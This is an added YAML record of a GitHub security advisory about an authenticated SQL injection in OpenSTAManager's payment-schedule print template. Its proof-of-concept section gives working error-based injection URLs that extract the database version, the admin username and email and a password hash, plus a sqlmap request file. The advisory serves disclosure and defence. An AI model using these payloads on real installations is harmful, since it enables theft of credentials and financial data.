@@ -1,0 +1,267 @@
+advisory_id: GHSA-q6g3-fv43-m2w6
+datasource_id: github_osv/GHSA-q6g3-fv43-m2w6
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-q6g3-fv43-m2w6/GHSA-q6g3-fv43-m2w6.json
+aliases:
+  - CVE-2025-69216
+summary: |
+  OpenSTAManager has a SQL Injection in Scadenzario Print Template
+  ### Summary
+  An **authenticated SQL Injection vulnerability** in OpenSTAManager's Scadenzario (Payment Schedule) print template allows any authenticated user to extract sensitive data from the database, including admin credentials, customer information, and financial records. The vulnerability enables complete database read access through error-based SQL injection techniques.
+
+  ### Details
+
+  The vulnerability exists in `templates/scadenzario/init.php` at **line 46**, where the `id_anagrafica` parameter is directly concatenated into an SQL query without proper sanitization:
+
+  **Vulnerable Code:**
+  ```php
+  if (get('id_anagrafica') && get('id_anagrafica') != 'null') {
+      $module_query = str_replace('1=1', '1=1 AND `co_scadenziario`.`idanagrafica`="'.get('id_anagrafica').'"', $module_query);
+      $id_anagrafica = get('id_anagrafica');
+  }
+  ```
+
+  The `get()` function retrieves user input from GET/POST parameters without validation. The parameter value is directly embedded into the SQL query string using string concatenation instead of using the application's `prepare()` sanitization function, enabling SQL Injection attacks.
+
+  **Root Cause:**
+  - Missing use of `prepare()` function for input sanitization
+  - Direct string concatenation in SQL query construction
+  - No input validation or type checking
+
+  **Affected Endpoint:**
+  ```
+  /pdfgen.php?ptype=scadenzario&id_anagrafica=[INJECTION_PAYLOAD]
+  ```
+
+  **Affected Files:**
+  - `templates/scadenzario/init.php` (line 46) - **Primary vulnerability**
+  - `templates/scadenzario/init.php` (lines 34, 40) - Similar pattern with date parameters
+  - `pdfgen.php` - Entry point for template rendering
+
+
+  ---
+
+  ### PoC (Proof of Concept)
+
+  #### Prerequisites
+  - Valid authenticated session (any user role)
+
+  #### Exploitation Steps
+
+  **1. Confirm Vulnerability - Basic Syntax Error Test:**
+  ```bash
+   http://localhost:8081/pdfgen.php?ptype=scadenzario&id_anagrafica=1%22%20--%20
+  ```
+
+  SQL syntax error displayed in application response
+
+  <img width="2195" height="392" alt="image" src="https://github.com/user-attachments/assets/f62ca7b4-2397-4f90-8698-6cf7f867d102" />
+
+  ---
+
+  **2. Extract Database Version - Error-Based SQLi:**
+  ```bash
+  http://localhost:8081/pdfgen.php?ptype=scadenzario&id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))%20AND%20%221%22=%221
+  ```
+
+  **Result:** `~8.3.0~` (MySQL version)
+
+  <img width="2061" height="378" alt="image" src="https://github.com/user-attachments/assets/8ea16c47-36cc-4c25-a624-b42ccfcdf52f" />
+
+  ---
+
+  **3. Extract Database Name:**
+  ```bash
+  http://localhost:8081/pdfgen.php?ptype=scadenzario&id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))%20AND%20%221%22=%221
+  ```
+
+  **Result:** `~openstamanager~`
+
+  <img width="1954" height="345" alt="image" src="https://github.com/user-attachments/assets/47479297-5271-4c03-b242-efa513eb28f8" />
+
+  ---
+
+  **4. Extract Admin Username:**
+  ```bash
+  http://localhost:8081/pdfgen.php?ptype=scadenzario&id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20username%20FROM%20zz_users%20LIMIT%201),0x7e))%20AND%20%221%22=%221
+  ```
+
+  **Result:** `~admin~`
+  <img width="1998" height="332" alt="image" src="https://github.com/user-attachments/assets/9f8363cb-8da9-4e8f-8744-ef38c9706be8" />
+
+  ---
+
+  **5. Extract Admin Email:**
+  ```bash
+  http://localhost:8081/pdfgen.php?ptype=scadenzario&id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20email%20FROM%20zz_users%20LIMIT%201),0x7e))%20AND%20%221%22=%221
+  ```
+
+  **Result:** Admin email address
+
+  <img width="2006" height="339" alt="image" src="https://github.com/user-attachments/assets/4dcd5ea4-4eea-4730-8d39-b8ce2da46e84" />
+
+  ---
+
+  **6. Extract Password Hash (Partial - XPATH 31 char limit):**
+  ```bash
+  http://localhost:8081/pdfgen.php?ptype=scadenzario&id_anagrafica=1%22%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20password%20FROM%20zz_users%20LIMIT%201),0x7e))%20AND%20%221%22=%221
+  ```
+
+  **Result:** bcrypt password hash
+
+  <img width="1924" height="328" alt="image" src="https://github.com/user-attachments/assets/27b711f3-9bb6-4909-a5bd-a04177c9f219" />
+
+  ---
+
+  **7. Automated Exploitation with SQLMap:**
+
+  Create request file `sqli_osm.req`:
+  ```http
+  GET /pdfgen.php?ptype=scadenzario&id_anagrafica=1* HTTP/1.1
+  Host: localhost:8081
+  Cookie: PHPSESSID=[SESSION_COOKIE]
+  User-Agent: Mozilla/5.0
+  ```
+
+  Run SQLMap:
+  ```bash
+  sqlmap -r sqli_osm.req --level 3 --risk 3 --dbs
+  ```
+
+  **SQLMap Confirmed Injection Types:**
+  - ✅ Boolean-based blind SQL injection
+  - ✅ Error-based SQL injection (MySQL >= 5.6 GTID_SUBSET)
+  - ✅ Time-based blind SQL injection (SLEEP)
+
+  <img width="1498" height="516" alt="image" src="https://github.com/user-attachments/assets/b733f025-ac4b-4b36-a20e-76d826005f62" />
+
+  ---
+
+  ### Impact
+
+  **Who is Impacted:**
+  - ✅ **All authenticated users** - Any user with valid credentials can exploit this vulnerability
+  - ✅ **Low-privilege users** - Even users with minimal permissions can access admin-level data
+  - ✅ **All OpenSTAManager installations** - Vulnerability exists in the latest master branch
+  ---
+
+  ### Attribution
+  Reported by Łukasz Rybak
+impacted_packages:
+  - purl: pkg:composer/devcode-it/openstamanager
+    affected_versions: vers:composer/<=2.9.8
+    fixed_versions:
+    affected_packages:
+      - pkg:composer/devcode-it/openstamanager@2.3.0
+      - pkg:composer/devcode-it/openstamanager@2.4.0
+      - pkg:composer/devcode-it/openstamanager@2.4.1
+      - pkg:composer/devcode-it/openstamanager@2.4.2
+      - pkg:composer/devcode-it/openstamanager@2.4.3
+      - pkg:composer/devcode-it/openstamanager@2.4.4
+      - pkg:composer/devcode-it/openstamanager@2.4.5
+      - pkg:composer/devcode-it/openstamanager@2.4.6
+      - pkg:composer/devcode-it/openstamanager@2.4.7
+      - pkg:composer/devcode-it/openstamanager@2.4.8
+      - pkg:composer/devcode-it/openstamanager@2.4.9
+      - pkg:composer/devcode-it/openstamanager@2.4.10
+      - pkg:composer/devcode-it/openstamanager@2.4.11
+      - pkg:composer/devcode-it/openstamanager@2.4.12
+      - pkg:composer/devcode-it/openstamanager@2.4.13
+      - pkg:composer/devcode-it/openstamanager@2.4.14
+      - pkg:composer/devcode-it/openstamanager@2.4.15
+      - pkg:composer/devcode-it/openstamanager@2.4.16
+      - pkg:composer/devcode-it/openstamanager@2.4.17
+      - pkg:composer/devcode-it/openstamanager@2.4.17%2B1
+      - pkg:composer/devcode-it/openstamanager@2.4.18
+      - pkg:composer/devcode-it/openstamanager@2.4.19
+      - pkg:composer/devcode-it/openstamanager@2.4.20
+      - pkg:composer/devcode-it/openstamanager@2.4.21
+      - pkg:composer/devcode-it/openstamanager@2.4.22
+      - pkg:composer/devcode-it/openstamanager@2.4.23
+      - pkg:composer/devcode-it/openstamanager@2.4.24
+      - pkg:composer/devcode-it/openstamanager@2.4.25
+      - pkg:composer/devcode-it/openstamanager@2.4.26
+      - pkg:composer/devcode-it/openstamanager@2.4.27
+      - pkg:composer/devcode-it/openstamanager@2.4.28
+      - pkg:composer/devcode-it/openstamanager@2.4.29
+      - pkg:composer/devcode-it/openstamanager@2.4.30
+      - pkg:composer/devcode-it/openstamanager@2.4.31
+      - pkg:composer/devcode-it/openstamanager@2.4.32
+      - pkg:composer/devcode-it/openstamanager@2.4.33
+      - pkg:composer/devcode-it/openstamanager@2.4.34
+      - pkg:composer/devcode-it/openstamanager@2.4.35
+      - pkg:composer/devcode-it/openstamanager@2.4.36
+      - pkg:composer/devcode-it/openstamanager@2.4.37
+      - pkg:composer/devcode-it/openstamanager@2.4.38
+      - pkg:composer/devcode-it/openstamanager@2.4.39
+      - pkg:composer/devcode-it/openstamanager@2.4.40
+      - pkg:composer/devcode-it/openstamanager@2.4.41
+      - pkg:composer/devcode-it/openstamanager@2.4.42
+      - pkg:composer/devcode-it/openstamanager@2.4.43
+      - pkg:composer/devcode-it/openstamanager@2.4.44
+      - pkg:composer/devcode-it/openstamanager@2.4.45
+      - pkg:composer/devcode-it/openstamanager@2.4.46
+      - pkg:composer/devcode-it/openstamanager@2.4.47
+      - pkg:composer/devcode-it/openstamanager@2.4.48
+      - pkg:composer/devcode-it/openstamanager@2.4.49
+      - pkg:composer/devcode-it/openstamanager@2.4.50
+      - pkg:composer/devcode-it/openstamanager@2.4.51
+      - pkg:composer/devcode-it/openstamanager@2.4.52
+      - pkg:composer/devcode-it/openstamanager@2.4.53
+      - pkg:composer/devcode-it/openstamanager@2.4.54
+      - pkg:composer/devcode-it/openstamanager@2.5.0
+      - pkg:composer/devcode-it/openstamanager@2.5.1-beta
+      - pkg:composer/devcode-it/openstamanager@2.5.2-beta
+      - pkg:composer/devcode-it/openstamanager@2.5.3
+      - pkg:composer/devcode-it/openstamanager@2.5.4
+      - pkg:composer/devcode-it/openstamanager@2.5.5
+      - pkg:composer/devcode-it/openstamanager@2.5.6
+      - pkg:composer/devcode-it/openstamanager@2.5.7
+      - pkg:composer/devcode-it/openstamanager@2.6.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.6.1
+      - pkg:composer/devcode-it/openstamanager@2.6.2
+      - pkg:composer/devcode-it/openstamanager@2.7.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.7.0
+      - pkg:composer/devcode-it/openstamanager@2.7.1
+      - pkg:composer/devcode-it/openstamanager@2.7.2
+      - pkg:composer/devcode-it/openstamanager@2.7.3
+      - pkg:composer/devcode-it/openstamanager@2.8.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.8.1
+      - pkg:composer/devcode-it/openstamanager@2.8.2
+      - pkg:composer/devcode-it/openstamanager@2.8.3
+      - pkg:composer/devcode-it/openstamanager@2.9.0-beta
+      - pkg:composer/devcode-it/openstamanager@2.9.0
+      - pkg:composer/devcode-it/openstamanager@2.9.1
+      - pkg:composer/devcode-it/openstamanager@2.9.2
+      - pkg:composer/devcode-it/openstamanager@2.9.3
+      - pkg:composer/devcode-it/openstamanager@2.9.4
+      - pkg:composer/devcode-it/openstamanager@2.9.5
+      - pkg:composer/devcode-it/openstamanager@2.9.6
+      - pkg:composer/devcode-it/openstamanager@2.9.7
+      - pkg:composer/devcode-it/openstamanager@2.9.8
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-q6g3-fv43-m2w6/GHSA-q6g3-fv43-m2w6.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-89
+references:
+  - url: https://github.com/devcode-it/openstamanager
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-69216
+    reference_type:
+    reference_id: CVE-2025-69216
+  - url: https://github.com/devcode-it/openstamanager/security/advisories/GHSA-q6g3-fv43-m2w6
+    reference_type:
+    reference_id: GHSA-q6g3-fv43-m2w6
+exploits: []
